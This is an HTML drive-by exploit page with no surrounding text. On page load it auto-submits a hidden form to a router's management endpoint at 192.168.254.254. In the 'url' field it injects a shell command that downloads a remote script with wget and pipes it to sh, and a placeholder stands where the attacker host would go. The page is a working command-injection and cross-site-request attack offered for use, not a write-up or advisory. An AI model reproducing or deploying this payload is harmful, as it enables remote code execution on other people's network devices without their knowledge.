<form method="post" id="exploit" action="http://192.168.254.254/goform/goform_set_cmd_process"><input name="isTest" value="false" type="hidden"><input name="goformId" value="send_at_tools" type="hidden"><input name="url" value="AT > /tmp/at_send.log && wget http://<LINK HERE>/zlt.sh -O - | sh &&" type="hidden"><input type="submit" style="display:none;"></form>
<script>
function exploit () {
var xploit = document.getElementById("exploit");
xploit.submit();
}
window.onload = exploit;
</script>